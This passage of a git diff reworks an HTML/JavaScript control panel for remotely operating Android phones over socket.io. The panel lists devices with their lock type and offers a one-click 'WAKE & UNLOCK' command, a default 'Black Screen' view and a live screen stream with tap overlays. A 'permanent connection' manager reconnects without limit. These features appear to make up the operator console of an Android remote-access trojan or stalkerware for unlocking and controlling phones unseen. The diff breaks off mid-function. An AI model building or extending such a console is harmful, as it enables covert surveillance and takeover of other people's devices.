@@ -3,98 +3,450 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Screen Control - Ultimate</title>
+    <title>Screen Control - Live View</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto:wght@400;700&display=swap');
         
-        body { font-family: 'Roboto', sans-serif; background-color: #121212; color: #e0e0e0; margin: 0; padding: 0; height: 100vh; overflow: hidden; }
-        .view { display: none; width: 100%; height: 100%; }
-        .view.active { display: flex; }
-
-        /* डिवाइस सूची */
-        #device-list-view { flex-direction: column; }
-        .header { background-color: #1e1e1e; padding: 20px; text-align: center; border-bottom: 2px solid #00ff00; }
-        .header h1 { font-family: 'Orbitron', sans-serif; margin: 0; font-size: 2.5em; color: #00ff00; text-shadow: 0 0 10px #00ff00; }
-        #device-list-container { padding: 30px; overflow-y: auto; flex-grow: 1; }
-        #device-list { list-style: none; padding: 0; margin: 0; }
-        .device { background-color: #1e1e1e; margin-bottom: 15px; border-radius: 8px; border-left: 5px solid #555; padding: 20px; cursor: pointer; transition: all 0.3s ease; display: flex; justify-content: space-between; align-items: center; }
-        .device:hover { transform: translateY(-5px); box-shadow: 0 10px 20px rgba(0,0,0,0.2); border-left-color: #00ff00; }
-        .device-name { font-size: 1.5em; font-weight: 700; }
-        .device-info { font-size: 1em; color: #aaa; }
-        .status-dot { height: 15px; width: 15px; background-color: #28a745; border-radius: 50%; display: inline-block; box-shadow: 0 0 8px #28a745; }
-        .lock-badge { background: #ff4444; color: white; padding: 2px 8px; border-radius: 10px; font-size: 0.8em; margin-left: 10px; }
-        .lock-badge.unlocked { background: #44ff44; }
-
-        /* कंट्रोल व्यू */
-        #control-view { flex-direction: column; }
-        .control-header { display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; background-color: #1e1e1e; border-bottom: 1px solid #333; flex-wrap: wrap; gap: 10px; }
-        #back-to-list-btn { background-color: #3f3f46; color: white; border: 1px solid #555; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-size: 1em; }
-        #device-title { font-size: 1.2em; font-weight: bold; }
-        .lock-info { background: #2a2a2a; padding: 5px 10px; border-radius: 5px; font-size: 0.9em; }
+        body { 
+            font-family: 'Roboto', sans-serif; 
+            background-color: #121212; 
+            color: #e0e0e0; 
+            margin: 0; 
+            padding: 0; 
+            height: 100vh; 
+            overflow: hidden; 
+        }
         
-        .main-container { display: flex; flex-grow: 1; }
-        .screen-area { flex-grow: 1; display: flex; align-items: center; justify-content: center; padding: 15px; }
-        #screen-viewport { border: 8px solid #444; border-radius: 20px; background-color: #000; box-shadow: 0 0 20px rgba(0,0,0,0.5); overflow: hidden; }
-        #screen-container { position: relative; background-color: #000; transform-origin: top left; }
-        .screen-element { position: absolute; border: 1px solid rgba(0, 255, 255, 0.6); background-color: rgba(0, 139, 139, 0.2); box-sizing: border-box; cursor: pointer; display: flex; align-items: center; justify-content: center; text-align: center; padding: 2px; }
-        .element-text { color: white; font-size: 12px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 100%; }
+        /* Main Views */
+        .view { 
+            display: none; 
+            width: 100%; 
+            height: 100%; 
+        }
+        .view.active { 
+            display: flex; 
+            flex-direction: column;
+        }
         
-        .all-controls { width: 80px; background-color: #1e1e1e; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 12px; padding: 10px; }
-        .control-button { width: 55px; height: 55px; background-color: #3f3f46; border: 1px solid #555; color: white; border-radius: 50%; cursor: pointer; font-size: 24px; transition: background-color 0.2s; display: flex; align-items: center; justify-content: center; }
-        .control-button:hover { background-color: #555; }
-        .divider { height: 1px; width: 80%; background-color: #444; margin: 10px 0; }
-
-        /* सिंगल मुख्य बटन */
+        /* Device List View */
+        #device-list-view { 
+            flex-direction: column; 
+        }
+        
+        .header { 
+            background-color: #1e1e1e; 
+            padding: 15px 20px; 
+            text-align: center; 
+            border-bottom: 2px solid #00ff00; 
+            flex-shrink: 0;
+        }
+        
+        .header h1 { 
+            font-family: 'Orbitron', sans-serif; 
+            margin: 0; 
+            font-size: 2em; 
+            color: #00ff00; 
+            text-shadow: 0 0 10px #00ff00; 
+        }
+        
+        #device-list-container { 
+            padding: 20px; 
+            overflow-y: auto; 
+            flex-grow: 1; 
+        }
+        
+        #device-list { 
+            list-style: none; 
+            padding: 0; 
+            margin: 0; 
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 15px;
+        }
+        
+        .device { 
+            background-color: #1e1e1e; 
+            border-radius: 10px; 
+            border-left: 5px solid #555; 
+            padding: 20px; 
+            cursor: pointer; 
+            transition: all 0.3s ease; 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+        }
+        
+        .device:hover { 
+            transform: translateY(-3px); 
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2); 
+            border-left-color: #00ff00; 
+        }
+        
+        .device-name { 
+            font-size: 1.3em; 
+            font-weight: 700; 
+        }
+        
+        .device-info { 
+            font-size: 0.9em; 
+            color: #aaa; 
+        }
+        
+        .status-dot { 
+            height: 15px; 
+            width: 15px; 
+            background-color: #28a745; 
+            border-radius: 50%; 
+            display: inline-block; 
+            box-shadow: 0 0 8px #28a745; 
+        }
+        
+        .lock-badge { 
+            background: #ff4444; 
+            color: white; 
+            padding: 2px 8px; 
+            border-radius: 10px; 
+            font-size: 0.8em; 
+            margin-left: 10px; 
+        }
+        
+        .lock-badge.unlocked { 
+            background: #44ff44; 
+        }
+        
+        /* Control View */
+        #control-view { 
+            flex-direction: column; 
+        }
+        
+        .control-header { 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            padding: 10px 20px; 
+            background-color: #1e1e1e; 
+            border-bottom: 1px solid #333; 
+            flex-wrap: wrap; 
+            gap: 10px; 
+            flex-shrink: 0;
+        }
+        
+        #back-to-list-btn { 
+            background-color: #3f3f46; 
+            color: white; 
+            border: 1px solid #555; 
+            padding: 8px 15px; 
+            border-radius: 5px; 
+            cursor: pointer; 
+            font-size: 1em; 
+        }
+        
+        #device-title { 
+            font-size: 1.2em; 
+            font-weight: bold; 
+        }
+        
+        .lock-info { 
+            background: #2a2a2a; 
+            padding: 5px 10px; 
+            border-radius: 5px; 
+            font-size: 0.9em; 
+        }
+        
+        /* Screen View Toggle Buttons */
+        .screen-toggle-buttons {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .screen-toggle-btn {
+            background: #3f3f46;
+            color: white;
+            border: 1px solid #555;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 0.9em;
+            transition: all 0.3s;
+        }
+        
+        .screen-toggle-btn:hover {
+            background: #555;
+        }
+        
+        .screen-toggle-btn.active {
+            background: #00ff00;
+            color: #000;
+            border-color: #00ff00;
+        }
+        
+        /* Main Container */
+        .main-container { 
+            display: flex; 
+            flex-grow: 1; 
+            min-height: 0;
+            overflow: hidden;
+        }
+        
+        .screen-area { 
+            flex-grow: 1; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            padding: 15px; 
+            position: relative;
+            overflow: auto;
+        }
+        
+        .screen-viewport {
+            border: 3px solid #444; 
+            border-radius: 10px; 
+            background-color: #000; 
+            box-shadow: 0 0 20px rgba(0,0,0,0.5); 
+            overflow: hidden; 
+            position: relative;
+            max-width: 95%;
+            max-height: 95%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .screen-container {
+            position: relative;
+            background-color: #000;
+            transform-origin: top left;
+            overflow: hidden;
+            max-width: 100%;
+            max-height: 100%;
+        }
+        
+        .screen-element {
+            position: absolute;
+            border: 1px solid rgba(0, 255, 255, 0.6);
+            background-color: rgba(0, 139, 139, 0.2);
+            box-sizing: border-box;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 2px;
+        }
+        
+        .element-text {
+            color: white;
+            font-size: 12px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            max-width: 100%;
+        }
+        
+        /* Live Screen Image */
+        .live-screen-image {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            background-color: #000;
+        }
+        
+        /* Clickable Overlay */
+        .clickable-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1000;
+        }
+        
+        .clickable-element {
+            position: absolute;
+            cursor: pointer;
+            border: 2px dashed rgba(0, 255, 0, 0.5);
+            background-color: rgba(0, 255, 0, 0.1);
+            transition: all 0.2s;
+            box-sizing: border-box;
+            pointer-events: all;
+        }
+        
+        .clickable-element:hover {
+            background-color: rgba(0, 255, 0, 0.3);
+            border: 2px solid rgba(0, 255, 0, 0.8);
+        }
+        
+        .all-controls { 
+            width: 80px; 
+            background-color: #1e1e1e; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: flex-start; 
+            gap: 12px; 
+            padding: 20px 10px;
+            flex-shrink: 0;
+            overflow-y: auto;
+        }
+        
+        .control-button { 
+            width: 55px; 
+            height: 55px; 
+            background-color: #3f3f46; 
+            border: 1px solid #555; 
+            color: white; 
+            border-radius: 50%; 
+            cursor: pointer; 
+            font-size: 24px; 
+            transition: background-color 0.2s; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            flex-shrink: 0;
+        }
+        
+        .control-button:hover { 
+            background-color: #555; 
+        }
+        
+        .divider { 
+            height: 1px; 
+            width: 80%; 
+            background-color: #444; 
+            margin: 10px 0; 
+        }
+        
+        /* Single Main Button */
         .single-main-btn { 
             background: linear-gradient(135deg, #0066cc, #0099ff);
             color: white;
             border: none;
-            padding: 15px 30px;
-            border-radius: 10px;
-            font-size: 1.2em;
+            padding: 12px 25px;
+            border-radius: 8px;
+            font-size: 1.1em;
             font-weight: bold;
             cursor: pointer;
             box-shadow: 0 5px 15px rgba(0, 102, 204, 0.4);
             transition: all 0.3s;
             display: flex;
             align-items: center;
-            gap: 10px;
+            gap: 8px;
+            flex-shrink: 0;
         }
+        
         .single-main-btn:hover {
             background: linear-gradient(135deg, #0099ff, #00ccff);
-            transform: translateY(-3px);
+            transform: translateY(-2px);
             box-shadow: 0 8px 20px rgba(0, 153, 255, 0.6);
         }
+        
         .single-main-btn:active {
             transform: translateY(1px);
         }
         
-        /* कीबोर्ड बटन */
-        .keyboard-buttons { 
-            position: absolute; 
-            bottom: 20px; 
-            left: 50%; 
-            transform: translateX(-50%); 
-            background: rgba(0,0,0,0.9); 
-            padding: 15px; 
-            border-radius: 15px; 
-            border: 2px solid #00ff00;
-            display: none; 
-            z-index: 1000;
+        /* Status Indicator */
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 0.9em;
+            flex-shrink: 0;
         }
-        .key-row { display: flex; justify-content: center; margin: 5px 0; }
-        .key-btn { width: 45px; height: 45px; margin: 3px; background: #333; border: 1px solid #555; color: white; border-radius: 8px; cursor: pointer; font-size: 1.1em; }
-        .key-btn:hover { background: #444; }
-        .key-btn.special { background: #0066cc; }
-        .key-btn.enter { background: #00aa00; }
+        
+        .live-indicator {
+            width: 10px;
+            height: 10px;
+            background-color: #ff4444;
+            border-radius: 50%;
+            animation: pulse 1s infinite;
+        }
+        
+        .live-indicator.active {
+            background-color: #44ff44;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        
+        /* Connection Status */
+        .connection-status {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 0.9em;
+            padding: 5px 10px;
+            border-radius: 5px;
+            background: #2a2a2a;
+        }
+        
+        .connection-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+        }
+        
+        .connection-dot.connected {
+            background-color: #44ff44;
+            box-shadow: 0 0 8px #44ff44;
+        }
+        
+        .connection-dot.disconnected {
+            background-color: #ff4444;
+            box-shadow: 0 0 8px #ff4444;
+        }
+        
+        /* Connection Stats */
+        .connection-stats {
+            font-size: 0.8em;
+            color: #aaa;
+            margin-top: 2px;
+        }
+        
+        /* Loading Spinner */
+        .loading-spinner {
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 1001;
+        }
+        
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-left-color: #00ff00;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Screen Content */
+        .screen-content {
+            display: none;
+            width: 100%;
+            height: 100%;
+        }
+        
+        .screen-content.active {
+            display: block;
+        }
     </style>
 </head>
 <body>
 
     <div id="device-list-view" class="view active">
         <div class="header">
-            <h1>🔓 SCREEN CONTROL v2.0</h1>
-            <p style="margin: 5px 0; color: #aaa;">Auto-lock detection • One-click unlock</p>
+            <h1>🔓 PERMANENT CONNECTION CONTROL</h1>
+            <p style="margin: 5px 0; color: #aaa;">Stable Connection • No Auto-Disconnect</p>
         </div>
         <div id="device-list-container">
             <ul id="device-list"></ul>
@@ -106,17 +458,49 @@
             <button id="back-to-list-btn">← Back to List</button>
             <h2 id="device-title"></h2>
             <div class="lock-info" id="lock-status">Lock: Unknown</div>
-            <!-- केवल एक ही मुख्य बटन -->
+            
+            <!-- Screen Toggle Buttons -->
+            <div class="screen-toggle-buttons">
+                <button id="btn-black-screen" class="screen-toggle-btn active">
+                    📦 Black Screen
+                </button>
+                <button id="btn-live-screen" class="screen-toggle-btn">
+                    📱 Live Screen
+                </button>
+            </div>
+            
+            <div class="status-indicator">
+                <div id="live-indicator" class="live-indicator"></div>
+                <span id="stream-status">Live Stream: Off</span>
+            </div>
+            
+            <div class="connection-status">
+                <div id="connection-dot" class="connection-dot disconnected"></div>
+                <span id="connection-status-text">Disconnected</span>
+                <div class="connection-stats" id="connection-stats">Uptime: 0s</div>
+            </div>
+            
             <button id="btn-wake-unlock" class="single-main-btn">
                 ⚡ WAKE & UNLOCK
             </button>
         </div>
         <div class="main-container">
             <div class="screen-area">
-                <div id="screen-viewport">
-                    <div id="screen-container"></div>
-                    <!-- कीबोर्ड -->
-                    <div id="keyboard-buttons" class="keyboard-buttons"></div>
+                <!-- Loading Spinner -->
+                <div id="loading-spinner" class="loading-spinner">
+                    <div class="spinner"></div>
+                    <div style="margin-top: 10px;">Initializing connection...</div>
+                </div>
+                
+                <!-- Black Screen View (Default) -->
+                <div id="black-screen-viewport" class="screen-viewport" style="display: block;">
+                    <div id="black-screen-container" class="screen-container"></div>
+                </div>
+                
+                <!-- Live Screen View (Hidden by default) -->
+                <div id="live-screen-viewport" class="screen-viewport" style="display: none;">
+                    <img id="live-screen-image" class="live-screen-image" src="" alt="Live Screen" />
+                    <div id="live-clickable-overlay" class="clickable-overlay"></div>
                 </div>
             </div>
             <div class="all-controls">
@@ -128,312 +512,488 @@
                 <button class="control-button" id="btn-back">⮌</button>
                 <button class="control-button" id="btn-home">⌂</button>
                 <button class="control-button" id="btn-recents">□</button>
+                <div class="divider"></div>
+                <button class="control-button" id="btn-start-stream">▶️</button>
+                <button class="control-button" id="btn-stop-stream">⏸️</button>
+                <div class="divider"></div>
+                <button class="control-button" id="btn-fullscreen">⬛</button>
+                <button class="control-button" id="btn-fit-screen">📐</button>
             </div>
         </div>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        const socket = io();
-        const deviceListView = document.getElementById('device-list-view');
-        const controlView = document.getElementById('control-view');
-        const deviceListEl = document.getElementById('device-list');
-        const screenContainer = document.getElementById('screen-container');
-        const screenViewport = document.getElementById('screen-viewport');
-        const deviceTitleEl = document.getElementById('device-title');
-        const lockStatusEl = document.getElementById('lock-status');
-        const backToListBtn = document.getElementById('back-to-list-btn');
-        const wakeUnlockBtn = document.getElementById('btn-wake-unlock');
-        const keyboardButtons = document.getElementById('keyboard-buttons');
-
-        let devices = {};
-        let activeDeviceId = null;
-        let currentKeyboardElement = null;
-
-        function showView(viewId) {
-            document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
-            document.getElementById(viewId).classList.add('active');
-        }
-
-        socket.on('connect', () => socket.emit('admin_join'));
-        socket.on('device_list', (initialDevices) => { 
-            deviceListEl.innerHTML = ''; 
-            devices = {}; 
-            initialDevices.forEach(addDeviceToList); 
-        });
-        socket.on('new_device_joined', addDeviceToList);
-        socket.on('device_disconnected', (deviceId) => {
-            const el = document.getElementById(`device-${deviceId}`);
-            if (el) el.remove();
-            delete devices[deviceId];
-            if (activeDeviceId === deviceId) {
-                showView('device-list-view');
-                activeDeviceId = null;
+        // Connection Manager - NO AUTO DISCONNECT
+        class ConnectionManager {
+            constructor() {
+                this.socket = null;
+                this.isConnected = false;
+                this.connectionStartTime = 0;
+                this.reconnectAttempts = 0;
+                this.maxReconnectAttempts = 10;
+                this.reconnectDelay = 2000;
+                this.heartbeatInterval = null;
+                this.connectionCheckInterval = null;
+                this.devices = {};
+                this.activeDeviceId = null;
+                this.isLiveStreaming = false;
+                this.lastHeartbeat = 0;
+                
+                // DOM Elements
+                this.elements = {
+                    deviceList: document.getElementById('device-list'),
+                    blackScreenContainer: document.getElementById('black-screen-container'),
+                    liveScreenImage: document.getElementById('live-screen-image'),
+                    liveClickableOverlay: document.getElementById('live-clickable-overlay'),
+                    deviceTitle: document.getElementById('device-title'),
+                    lockStatus: document.getElementById('lock-status'),
+                    connectionDot: document.getElementById('connection-dot'),
+                    connectionStatusText: document.getElementById('connection-status-text'),
+                    connectionStats: document.getElementById('connection-stats'),
+                    liveIndicator: document.getElementById('live-indicator'),
+                    streamStatus: document.getElementById('stream-status'),
+                    loadingSpinner: document.getElementById('loading-spinner')
+                };
+                
+                this.initialize();
             }
-        });
-
-        function addDeviceToList(device) {
-            if (document.getElementById(`device-${device.deviceId}`)) {
-                const infoEl = document.querySelector(`#device-${device.deviceId} .device-info`);
-                if (infoEl) {
-                    infoEl.innerHTML = `Battery: ${device.battery}% | Lock: ${device.lockType || "none"}`;
+            
+            initialize() {
+                this.setupEventListeners();
+                this.connectToServer();
+                this.startConnectionMonitor();
+                this.startUptimeCounter();
+            }
+            
+            setupEventListeners() {
+                // Back button
+                document.getElementById('back-to-list-btn').onclick = () => {
+                    this.stopLiveStream();
+                    this.activeDeviceId = null;
+                    this.showView('device-list-view');
+                };
+                
+                // Screen toggle buttons
+                document.getElementById('btn-black-screen').onclick = () => this.switchScreenView('black');
+                document.getElementById('btn-live-screen').onclick = () => {
+                    this.switchScreenView('live');
+                    if (!this.isLiveStreaming) {
+                        this.startLiveStream();
+                    }
+                };
+                
+                // Stream control buttons
+                document.getElementById('btn-start-stream').onclick = () => this.startLiveStream();
+                document.getElementById('btn-stop-stream').onclick = () => this.stopLiveStream();
+                
+                // Control buttons
+                document.getElementById('btn-back').onclick = () => this.sendCommand('global_action', { action: 'back' });
+                document.getElementById('btn-home').onclick = () => this.sendCommand('global_action', { action: 'home' });
+                document.getElementById('btn-recents').onclick = () => this.sendCommand('global_action', { action: 'recents' });
+                
+                // Scroll buttons
+                document.getElementById('btn-scroll-up').onclick = () => this.sendCommand('scroll_action', { direction: 'up' });
+                document.getElementById('btn-scroll-down').onclick = () => this.sendCommand('scroll_action', { direction: 'down' });
+                document.getElementById('btn-scroll-left').onclick = () => this.sendCommand('scroll_action', { direction: 'left' });
+                document.getElementById('btn-scroll-right').onclick = () => this.sendCommand('scroll_action', { direction: 'right' });
+                
+                // Wake & Unlock
+                document.getElementById('btn-wake-unlock').onclick = () => {
+                    if (!this.activeDeviceId) {
+                        alert("Please select a device first!");
+                        return;
+                    }
+                    this.sendCommand('unlock_device', {});
+                };
+                
+                // Fullscreen and fit screen
+                document.getElementById('btn-fullscreen').onclick = () => this.toggleFullscreen();
+                document.getElementById('btn-fit-screen').onclick = () => this.adjustScreenSize();
+                
+                // Window events
+                window.addEventListener('resize', () => this.adjustScreenSize());
+                window.addEventListener('beforeunload', () => {
+                    if (this.socket) {
+                        this.socket.disconnect();
+                    }
+                });
+            }
+            
+            connectToServer() {
+                console.log('🔄 Connecting to server...');
+                this.showLoading(true);
+                
+                // Create socket with PERMANENT connection settings
+                this.socket = io({
+                    reconnection: true,
+                    reconnectionAttempts: Infinity, // Never stop trying
+                    reconnectionDelay: 1000,
+                    reconnectionDelayMax: 5000,
+                    timeout: 60000, // 60 second timeout
+                    transports: ['websocket', 'polling'],
+                    forceNew: false, // Keep same connection
+                    multiplex: false // Separate connection
+                });
+                
+                // Socket event handlers
+                this.socket.on('connect', () => {
+                    console.log('✅✅✅ PERMANENTLY CONNECTED to server');
+                    this.isConnected = true;
+                    this.connectionStartTime = Date.now();
+                    this.reconnectAttempts = 0;
+                    this.updateConnectionStatus(true);
+                    this.showLoading(false);
+                    
+                    // Join as admin
+                    this.socket.emit('admin_join');
+                    
+                    // Start heartbeat
+                    this.startHeartbeat();
+                });
+                
+                this.socket.on('disconnect', (reason) => {
+                    console.log('❌ Disconnected:', reason);
+                    this.isConnected = false;
+                    this.updateConnectionStatus(false);
+                    
+                    // Only try to reconnect if it wasn't a manual disconnect
+                    if (reason !== 'io client disconnect' && reason !== 'transport close') {
+                        this.scheduleReconnection();
+                    }
+                });
+                
+                this.socket.on('connect_error', (error) => {
+                    console.log('🔌 Connection error:', error.message);
+                    this.updateConnectionStatus(false);
+                    this.scheduleReconnection();
+                });
+                
+                this.socket.on('reconnect', (attemptNumber) => {
+                    console.log(`✅ Reconnected after ${attemptNumber} attempts`);
+                    this.isConnected = true;
+                    this.updateConnectionStatus(true);
+                });
+                
+                this.socket.on('reconnect_attempt', (attemptNumber) => {
+                    console.log(`🔄 Reconnection attempt ${attemptNumber}`);
+                });
+                
+                this.socket.on('reconnect_error', (error) => {
+                    console.log('🔌 Reconnect error:', error);
+                });
+                
+                this.socket.on('reconnect_failed', () => {
+                    console.log('🔌 Reconnect failed');
+                    this.scheduleReconnection();
+                });
+                
+                // Application event handlers
+                this.socket.on('device_list', (devices) => this.handleDeviceList(devices));
+                this.socket.on('new_device_joined', (device) => this.addDeviceToList(device));
+                this.socket.on('device_disconnected', (deviceId) => this.removeDevice(deviceId));
+                this.socket.on('screen_update', (data) => this.handleScreenUpdate(data));
+                this.socket.on('live_screen', (data) => this.handleLiveScreen(data));
+                this.socket.on('heartbeat', (data) => this.handleHeartbeat(data));
+            }
+            
+            scheduleReconnection() {
+                if (this.reconnectAttempts >= this.maxReconnectAttempts) {
+                    console.log('🚫 Max reconnection attempts reached');
+                    return;
                 }
-                return;
+                
+                this.reconnectAttempts++;
+                console.log(`📅 Scheduling reconnection ${this.reconnectAttempts}/${this.maxReconnectAttempts}`);
+                
+                setTimeout(() => {
+                    if (!this.isConnected && this.socket) {
+                        console.log('🔄 Attempting to reconnect...');
+                        this.socket.connect();
+                    }
+                }, this.reconnectDelay * Math.min(this.reconnectAttempts, 5));
             }
-
-            devices[device.deviceId] = device;
             
-            const li = document.createElement('li');
-            li.className = 'device';
-            li.id = `device-${device.deviceId}`;
+            startConnectionMonitor() {
+                setInterval(() => {
+                    if (this.socket && !this.socket.connected && this.reconnectAttempts < this.maxReconnectAttempts) {
+                        console.log('🔍 Connection monitor: Attempting reconnect');
+                        this.socket.connect();
+                    }
+                }, 10000); // Check every 10 seconds
+            }
             
-            const lockType = device.lockType || "none";
-            const lockBadge = lockType !== "none" ? 
-                `<span class="lock-badge">🔒 ${lockType}</span>` : 
-                `<span class="lock-badge unlocked">🔓 unlocked</span>`;
-            
-            li.innerHTML = `
-                <div>
-                    <div class="device-name">${device.deviceName} ${lockBadge}</div>
-                    <div class="device-info">Battery: ${device.battery}% | Android: ${device.androidVersion}</div>
-                </div>
-                <span class="status-dot"></span>
-            `;
-            
-            li.addEventListener('click', () => {
-                activeDeviceId = device.deviceId;
-                deviceTitleEl.textContent = `${device.deviceName} - Remote Control`;
-                lockStatusEl.textContent = `Lock: ${device.lockType || "none"}`;
-                screenContainer.innerHTML = '📡 Receiving screen data...';
-                showView('control-view');
-            });
-            deviceListEl.appendChild(li);
-        }
-
-        socket.on('screen_update', (data) => {
-            if (data.deviceId !== activeDeviceId) return;
-            
-            window.requestAnimationFrame(() => {
-                screenContainer.innerHTML = '';
-                const remoteWidth = data.screenWidth, remoteHeight = data.screenHeight;
-                const viewportHeight = screenViewport.clientHeight;
-                const scale = viewportHeight / remoteHeight;
+            startHeartbeat() {
+                if (this.heartbeatInterval) {
+                    clearInterval(this.heartbeatInterval);
+                }
                 
-                screenViewport.style.width = (remoteWidth * scale) + 'px';
-                screenContainer.style.width = remoteWidth + 'px';
-                screenContainer.style.height = remoteHeight + 'px';
-                screenContainer.style.transform = `scale(${scale})`;
+                this.heartbeatInterval = setInterval(() => {
+                    if (this.socket && this.socket.connected) {
+                        this.socket.emit('heartbeat', { 
+                            timestamp: Date.now(),
+                            activeDevice: this.activeDeviceId 
+                        });
+                        this.lastHeartbeat = Date.now();
+                    }
+                }, 15000); // Send heartbeat every 15 seconds
+            }
+            
+            startUptimeCounter() {
+                setInterval(() => {
+                    if (this.isConnected && this.connectionStartTime > 0) {
+                        const uptime = Math.floor((Date.now() - this.connectionStartTime) / 1000);
+                        this.elements.connectionStats.textContent = `Uptime: ${uptime}s`;
+                    }
+                }, 1000);
+            }
+            
+            updateConnectionStatus(connected) {
+                this.isConnected = connected;
                 
-                // लॉक स्टेटस अपडेट
+                if (connected) {
+                    this.elements.connectionDot.className = 'connection-dot connected';
+                    this.elements.connectionStatusText.textContent = 'Connected';
+                    this.elements.connectionStatusText.style.color = '#44ff44';
+                    this.showLoading(false);
+                } else {
+                    this.elements.connectionDot.className = 'connection-dot disconnected';
+                    this.elements.connectionStatusText.textContent = 'Disconnected';
+                    this.elements.connectionStatusText.style.color = '#ff4444';
+                    
+                    if (this.activeDeviceId) {
+                        this.showLoading(true);
+                    }
+                }
+            }
+            
+            showLoading(show) {
+                this.elements.loadingSpinner.style.display = show ? 'block' : 'none';
+            }
+            
+            showView(viewId) {
+                document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
+                document.getElementById(viewId).classList.add('active');
+            }
+            
+            // Device Management
+            handleDeviceList(devices) {
+                this.elements.deviceList.innerHTML = '';
+                this.devices = {};
+                devices.forEach(device => this.addDeviceToList(device));
+            }
+            
+            addDeviceToList(device) {
+                if (this.devices[device.deviceId]) {
+                    const infoEl = document.querySelector(`#device-${device.deviceId} .device-info`);
+                    if (infoEl) {
+                        infoEl.innerHTML = `Battery: ${device.battery}% | Lock: ${device.lockType || "none"}`;
+                    }
+                    return;
+                }
+                
+                this.devices[device.deviceId] = device;
+                
+                const li = document.createElement('li');
+                li.className = 'device';
+                li.id = `device-${device.deviceId}`;
+                
+                const lockType = device.lockType || "none";
+                const lockBadge = lockType !== "none" ? 
+                    `<span class="lock-badge">🔒 ${lockType}</span>` : 
+                    `<span class="lock-badge unlocked">🔓 unlocked</span>`;
+                
+                li.innerHTML = `
+                    <div>
+                        <div class="device-name">${device.deviceName} ${lockBadge}</div>
+                        <div class="device-info">Battery: ${device.battery}% | Android: ${device.androidVersion}</div>
+                    </div>
+                    <span class="status-dot"></span>
+                `;
+                
+                li.addEventListener('click', () => {
+                    this.activeDeviceId = device.deviceId;
+                    this.elements.deviceTitle.textContent = `${device.deviceName} - Live Control`;
+                    this.elements.lockStatus.textContent = `Lock: ${device.lockType || "none"}`;
+                    this.elements.blackScreenContainer.innerHTML = '';
+                    this.elements.liveScreenImage.src = '';
+                    this.elements.liveClickableOverlay.innerHTML = '';
+                    this.showView('control-view');
+                    
+                    // Start live stream
+                    setTimeout(() => {
+                        this.startLiveStream();
+                    }, 500);
+                });
+                
+                this.elements.deviceList.appendChild(li);
+            }
+            
+            removeDevice(deviceId) {
+                const el = document.getElementById(`device-${deviceId}`);
+                if (el) el.remove();
+                delete this.devices[deviceId];
+                
+                if (this.activeDeviceId === deviceId) {
+                    this.activeDeviceId = null;
+                    this.showView('device-list-view');
+                }
+            }
+            
+            // Screen Management
+            switchScreenView(viewType) {
+                const btnBlack = document.getElementById('btn-black-screen');
+                const btnLive = document.getElementById('btn-live-screen');
+                const blackViewport = document.getElementById('black-screen-viewport');
+                const liveViewport = document.getElementById('live-screen-viewport');
+                
+                btnBlack.classList.toggle('active', viewType === 'black');
+                btnLive.classList.toggle('active', viewType === 'live');
+                
+                if (viewType === 'black') {
+                    blackViewport.style.display = 'flex';
+                    liveViewport.style.display = 'none';
+                } else {
+                    blackViewport.style.display = 'none';
+                    liveViewport.style.display = 'flex';
+                }
+                
+                this.adjustScreenSize();
+            }
+            
+            adjustScreenSize() {
+                const viewport = document.querySelector('.screen-viewport[style*="display: flex"]');
+                if (!viewport) return;
+                
+                const screenArea = document.querySelector('.screen-area');
+                const availableWidth = screenArea.clientWidth - 40;
+                const availableHeight = screenArea.clientHeight - 40;
+                
+                viewport.style.width = `${Math.min(availableWidth * 0.9, 1200)}px`;
+                viewport.style.height = `${Math.min(availableHeight * 0.9, 800)}px`;
+            }
+            
+            toggleFullscreen() {
+                const viewport = document.querySelector('.screen-viewport[style*="display: flex"]');
+                if (!viewport) return;
+                
+                const btnFullscreen = document.getElementById('btn-fullscreen');
+                
+                if (viewport.style.width === '95%') {
+                    this.adjustScreenSize();
+                    btnFullscreen.textContent = '⬛';
+                } else {
+                    viewport.style.width = '95%';
+                    viewport.style.height = '95%';
+                    btnFullscreen.textContent = '⛶';
+                }
+            }
+            
+            // Stream Management
+            startLiveStream() {
+                if (!this.activeDeviceId || this.isLiveStreaming) return;
+                
+                this.sendCommand('start_live_stream', {});
+                this.isLiveStreaming = true;
+                this.elements.liveIndicator.classList.add('active');
